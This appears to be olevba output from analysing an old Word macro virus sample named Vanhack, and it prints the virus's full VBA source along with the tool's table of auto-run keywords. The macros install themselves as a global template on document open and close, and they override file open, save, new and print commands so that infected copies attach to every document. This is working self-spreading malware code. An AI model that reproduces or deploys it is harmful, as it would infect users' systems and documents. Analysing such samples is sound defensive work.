olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vanhack
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Vanhack - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
AddIns.Unload False
Brando_MM.ThisDocument.SaveAs FileName:=Options.DefaultFilePath(8) & "\vanhack"
AddIns.Add (Options.DefaultFilePath(8) & "\vanhack.dot")
End Sub
Private Sub Document_New()
Document_Open
End Sub
Private Sub Document_Open()
On Error Resume Next
AddIns.Unload False
AddIns.Add(Brando_MM.ThisDocument.FullName).Installed = True
End Sub

-------------------------------------------------------------------------------
VBA MACRO VanHack.bas 
in file: Virus.MSWord.Vanhack - OLE stream: 'Macros/VBA/VanHack'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
On Error Resume Next
AddIns.Add (Options.DefaultFilePath(8) & "\vanhack.dot")
End Sub
Sub FileTemplates()
End Sub
Sub FileOpen()
On Error Resume Next
Dialogs(wdDialogFileOpen).Show
AddIns.Add (Options.DefaultFilePath(8) & "\vanhack.dot")
xDoc
End Sub
Function xDoc()
On Error Resume Next
With ActiveDocument
.AttachedTemplate = Brando_MM.ThisDocument.FullName
.Save
End With
End Function
Function xSaveSTR()
On Error Resume Next
AddIns.Unload False
Brando_MM.ThisDocument.SaveAs FileName:=Options.DefaultFilePath(8) & "\vanhack"
End Function
Function xSaveDOC()
On Error Resume Next
Brando_MM.ThisDocument.SaveAs FileName:=Options.DefaultFilePath(wdDocumentsPath) & "vanhack"
Brando_MM.ThisDocument.SaveAs FileName:=Options.DefaultFilePath(wdDocumentsPath) & "\vanhack"
End Function
Sub FileClose()
On Error Resume Next
xSaveSTR
ActiveDocument.Close
End Sub
Sub AutoClose()
FileClose
End Sub
Sub FileSave()
On Error Resume Next
xSaveDOC
ActiveDocument.Save
End Sub
Sub FileNew()
Dialogs(wdDialogFileNew).Show
xDoc
xSaveDOC
End Sub
Sub FilePrint()
Dialogs(wdDialogFilePrint).Show
xDoc
xSaveDOC
End Sub
Sub FilePrintSetup()
Dialogs(wdDialogFilePrintSetup).Show
xDoc
xSaveDOC
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
+----------+--------------------+---------------------------------------------+

